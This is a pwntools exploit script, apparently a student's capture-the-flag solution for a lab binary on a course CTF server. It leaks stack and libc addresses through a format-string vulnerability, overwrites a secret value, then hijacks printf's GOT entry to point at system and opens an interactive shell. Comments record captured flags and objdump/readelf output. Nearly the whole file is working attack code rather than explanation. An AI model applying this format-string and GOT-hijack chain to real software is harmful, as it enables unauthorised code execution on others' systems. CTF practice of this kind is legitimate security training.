from pwn import *
r = process('./lab-1')
a = 0x6012ac

p = '%p.' * 20
r.sendafter('name ?' , p)

field =  [ "param_{}".format(i) for i in range(1,21)]
s = r.recvline()
s = r.recvline()
s = r.recvline().decode().split('.')
for _1,_2 in zip(field,s):
	print(_1  , ":" , _2)


# by ('param_16', ':', u'0x70252e70252e7025') , we know 16 is our format string
r.close()
# r = process('./lab-1')
r = remote('csie.ctf.tw','10129')
# _ = raw_input()
# To use large space, use 0x30 space, and it's 22th parameters we need to write.
# 0xb00c = 45068
# 0xface = 64206, 64206-45068 = 19138

p = '%45068c%24$hn%19138c%25$hn%8$p.%9$p|%26$s|'.ljust(0x40,'\x00') + p64(a) + p64(a+2)+ p64(0x6011e0)
# 16 -> name; 16 - 8 -> secret
# char name[0x60] , secret[0x10] , buf[0x30];
r.sendafter('name ?' , p)
_,_,s = r.recvline(), r.recvline() , r.recvline()

s = s[64206:]
secret , remain , _  = s.split('|')
secret_a,secret_b = int(secret.split('.')[0],16) , int(secret.split('.')[1],16)
r.send(  p64(secret_a) + p64(secret_b))
# flag1: FLAG{y0u_f0und_me_:D}
# flag2: FLAG{H0w_c0u1d_y0u_cr4ck_urandom_You_4re_5uch_4_h4cker_:)}
print('remain:' , b'[' + remain  + b']')

# readelf -x .rodata lab-1
#  0x00400c00 6174202f 686f6d65 2f6c6162 312f666c at /home/lab1/fl
#  0x00400c10 61670044 6f20796f 75206b6e 6f77206d ag.Do you know m
#  0x00400c30 74202f68 6f6d652f 6c616231 2f666c61 t /home/lab1/fla
#  0x00400c40 67320000 00000000 48656c6c 6f21206d g2......Hello! m

# target 
# 0x00400c41 33 (0x33 )
# well, halt when writing .rodata , so we need to GOT hijacking


# command : objdump -R ./lab-1
# 00000000006011e0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
libc_base = u64(remain.ljust(8,'\x00')) - 0x21ab0
# readelf  -a lab-1.so | grep start
# print('libc_base address:',p64(libc_base))
# r.interactive()
'''
arvin@lab5$ objdump -R lab-1 | grep printf
  0000000000601230 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5

arvin@lab5$ readelf -a ./lab-1.so | grep system
   232: 0000000000159e20    99 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
   607: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
'''

printf_got = 0x601230
system_libc = libc_base + 0x4f440
import re
l = [x for x in re.split(r'(\w{2})', hex(system_libc)[-6:]) if x]
l = list(map(lambda x : int(x,16),l))
print(l)
first_two_bytes = system_libc & 0xff
next_four_bytes = ((system_libc & 0xffff00) >> 8) - first_two_bytes
# p = '%{}c%13hhn%{}c%14$hn'.format(first_two_bytes,next_four_bytes).ljust(0x18,'\x00') + p64(printf_got) + p64(printf_got+1)
p = b'%{}c%13$hhn%{}c%14$hn'.format(first_two_bytes,next_four_bytes)
p = p.ljust(0x18,b'\x00')
p+=p64(printf_got)
p+=p64(printf_got+1)
print(hex(len(p)))
r.send(p)
# print(p,'\n')
# r.sendafter(':',p+'\n')
# print(s)

s = r.recvline()
s = r.recvline()
s = r.recvline()
r.interactive()
'''
- puts_got_value = libc_base + puts_libc
- So, libc_base = puts_got_value - puts_libc
'''